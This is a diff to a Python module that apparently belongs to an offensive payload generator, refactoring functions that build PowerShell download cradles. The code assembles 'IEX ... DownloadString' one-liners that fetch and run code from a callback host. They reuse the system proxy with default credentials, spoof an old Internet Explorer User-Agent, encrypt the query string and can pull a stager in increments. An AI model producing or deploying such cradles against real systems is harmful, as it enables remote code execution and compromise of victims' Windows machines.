@@ -83,62 +83,60 @@ def build_cradle_https(params):
 
 
 def build_cradle_webclient(params, key, incremental=False):
-    result = ''
     natural = params['natural']
     web_client = symbol_name('web_client', natural=natural, refresh=True)
 
-    if params['transport'].startswith('http'):
-        result += "$%(web_client)s=New-Object Net.WebClient;"
+    result = "$%(web_client)s=New-Object Net.WebClient;"
 
-        if params['proxy']:
-            result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
-                       "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
-                       "DefaultCredentials;")
+    if params['proxy']:
+        result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
+                   "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
+                   "DefaultCredentials;")
 
-        if params['useragent']:
-            result += (
-                "$%(web_client)s.Headers['User-Agent']="
-                "'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';"
-            )
-
-        url = callback_urls()[params['transport']]
-
-        query = '?'
-        for p in params.parameters:
-            if p.get_arg:
-                query += p.as_query_fragment()
-        query = query.replace('?&', '?')
-
-        if query.endswith('?'):
-            query = query[:-1]
-
-        if query:
-            # encrypt url
-            query = encrypt_aes(query, key)
-            # Make b64 encoding urlsafe
-            query = query.replace('/', '_').replace('+', '-')
-
-        downloader = "IEX $%(web_client)s.DownloadString('%(url)s%(query)s'%(extra)s)"
-
-        if incremental:
-            result += "(0..%(increments)s)|%%%%{" + downloader + "}"
-            # quadruple `%`, because we need to format that string a
-            # second time later
-            query += '/'
-            extra = '+$_'
-            increments = get_stager_increments() - 1  # -1 cause we start at 0
-        else:
-            result += downloader
-            extra = ''
-            increments = 0
-
-        result = result % dict(
-            url=url,
-            query=query,
-            extra=extra,
-            web_client=web_client,
-            increments=increments,
+    if params['useragent']:
+        result += (
+            "$%(web_client)s.Headers['User-Agent']="
+            "'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';"
         )
+
+    url = callback_urls()[params['transport']]
+
+    query = '?'
+    for p in params.parameters:
+        if p.get_arg:
+            query += p.as_query_fragment()
+    query = query.replace('?&', '?')
+
+    if query.endswith('?'):
+        query = query[:-1]
+
+    if query:
+        # encrypt url
+        query = encrypt_aes(query, key)
+        # Make b64 encoding urlsafe
+        query = query.replace('/', '_').replace('+', '-')
+
+    downloader = "IEX $%(web_client)s.DownloadString('%(url)s%(query)s'%(extra)s)"
+
+    if incremental:
+        result += "(0..%(increments)s)|%%%%{" + downloader + "}"
+        # quadruple `%`, because we need to format that string a
+        # second time later
+        query += '/'
+        extra = '+$_'
+        increments = get_stager_increments() - 1  # -1 cause we start at 0
+    else:
+        result += downloader
+        extra = ''
+        increments = 0
+
+    result = result % dict(
+        url=url,
+        query=query,
+        extra=extra,
+        web_client=web_client,
+        increments=increments,
+    )
 
     return result
 
@@ -156,7 +154,8 @@ def build_cradle(params, key):
     if params['kex'] == 'oob' and key:
         result += "$%(key_var)s='%(key)s';"
 
-    result += build_cradle_webclient(params, key, incremental=params['incremental'])
+    if params['transport'].startswith('http'):
+        result += build_cradle_webclient(params, key, incremental=params['incremental'])
 
     result = result % dict(
         url=callback_urls()[params['transport']],
